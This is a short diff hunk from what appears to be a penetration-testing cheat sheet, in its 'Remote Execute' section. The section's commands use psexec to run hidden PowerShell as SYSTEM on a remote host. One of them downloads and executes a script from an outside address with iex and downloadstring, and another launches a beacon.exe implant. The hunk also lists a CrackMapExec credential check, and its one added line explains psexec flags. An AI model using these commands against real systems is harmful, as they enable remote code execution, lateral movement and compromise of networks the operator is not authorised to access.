@@ -142,6 +142,7 @@ Remote Execute
         * PS windows may popup for a second on target
       psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -InputFormat None -nop -w hidden -c "iex (new-object net.webclient).downloadstring('http://10.10.16.13/cyber')"
       psexec \\10.9.15.200 /user:Domain.local\Administrator -s "C:\Users\user\desktop\beacon.exe"
+      * -s Runs as SYSTEM and -c copies file to C:\Windows on remote system
   
   CrackMapExec
     crackmapexec IP_Address -u username -p='password' (Test if you have access)
